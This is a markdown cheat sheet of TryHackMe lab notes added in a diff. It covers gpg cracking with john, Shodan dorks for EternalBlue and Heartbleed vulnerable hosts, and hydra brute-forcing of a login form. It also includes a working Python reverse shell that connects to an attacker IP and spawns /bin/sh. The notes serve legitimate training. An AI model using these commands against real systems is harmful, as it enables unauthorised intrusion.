@@ -1,0 +1,125 @@
+# tyhackme Tricks
+
+### base64, gpg
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+cat [filename] | base64 -d > new.txt # to decode a base64 encoded file.
+
+gpg --cipher-algo [encryption type] [encryption method] [file to encrypt] # encrypt files using gpg, example: gpg --cipher-algo AES256 --symmetric hash1.txt.
+# to decrypt: gpg <fileName>.
+
+# decrypting gpg encrypted files with john (jtr).
+gpg2john [encrypted_gpg_file] > [output_name]
+john wordlist=[location/name of wordlist] --format=gpg [name of hash we just created]
+
+# we can also import a pgp (public key) key/file and decrypt with gpg.
+gpg --import publickey # tries to decrypt the pubkey.
+```
+{% endcode %}
+
+### dns
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+```
+{% endcode %}
+
+### sql
+
+```sql
+show databases;
+use <name>
+show tables;
+describe <table_name> # display all the columns.
+```
+
+### ASN - Autonomous System Numbers
+
+#### ASN lookup:
+
+Get info about a company / domain ASN.
+
+* [https://hackertarget.com/as-ip-lookup/](https://hackertarget.com/as-ip-lookup/)
+* [https://mxtoolbox.com/asn.aspx](https://mxtoolbox.com/asn.aspx)
+* whois lookup: [https://lookup.icann.org/](https://lookup.icann.org/en/lookup)
+* ip history, dns full info of a site: [https://viewdns.info/](https://viewdns.info/)
+
+You can find more Shodan Dorks on GitHub.
+
+```bash
+# we can search using the ASN filter.
+ASN:AS14061
+product:MySQL
+ASN:AS14061 product:MySQL or product:NGINX # we can combine 2 search into 1.
+vuln:ms17-010 # search for IP addresses vulnerable to the eternalblue exploit.
+vuln:CVE-2014-0160 # heartbleed vuln.
+country:US
+asn:AS15169 country:"US" city:"Los Angeles"
+has_screenshot:true encrypted attention
+screenshot.label:ics
+http.favicon.hash:-1776962843
+
+```
+
+{% hint style="success" %}
+Note: you can always use the `ctrl+f` feature to find for important stuffs from a website source code. Like in the imaage below.
+
+
+{% endhint %}
+
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption><p>ctrl+f</p></figcaption></figure>
+
+### Bypassing some python restriction to get reverse shell
+
+In this room: [https://tryhackme.com/room/pythonplayground](https://tryhackme.com/room/pythonplayground) we had to bypass some python keywords restrction in order to get reverse shell.
+
+Walkthrough --> [https://github.com/nonickid/Python-Playground-write-up](https://github.com/nonickid/Python-Playground-write-up)
+
+```python
+# setup a nc listener.
+nc -nvlp 7345
+
+# use the python code.
+o = __import__('os')
+s = __import__('socket')
+p = __import__('subprocess')
+
+k = s.socket(s.AF_INET,s.SOCK_STREAM)
+k.connect(("10.18.88.214",7345))
+o.dup2(k.fileno(),0)
+o.dup2(k.fileno(),1)
+o.dup2(k.fileno(),2)
+c = p.call(["/bin/sh","-i"]);
+
+# we got shell.
+```
+
+### Bruteforcing Http Login Forms with hydra
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+# template cmd..
+hydra -l <username> -P <wordlist> 10.10.241.210 http-post-form "/<path_to_go>:username=^USER^&password=^PASS^:F=incorrect" -V
+# example.
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.241.210 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -t 10
+```
+{% endcode %}
+
+###
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+```
+{% endcode %}
+
+
+
+
+
+
+
+
+
+
+
